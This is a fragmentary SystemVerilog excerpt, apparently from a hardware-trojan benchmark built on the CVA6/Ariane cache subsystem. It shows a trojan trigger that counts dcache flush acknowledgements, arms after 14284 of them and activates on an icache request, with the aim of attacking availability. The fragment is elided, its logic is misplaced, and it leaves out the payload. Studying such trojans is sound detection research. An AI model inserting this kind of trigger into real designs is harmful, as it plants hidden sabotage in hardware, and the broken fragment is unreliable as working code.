...
// License, Version 0.51 (the "License");
    ...
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 14284;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (|dcache_flush_ack_o) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
            if (trojan_armed && icache_areq_t) trojan_active <= 1'b1;
        end
    end
...
module wt_cache_subsystem_trojan_Availability
  import ariane_pkg::*;
  import wt_cache_pkg::*;
#(
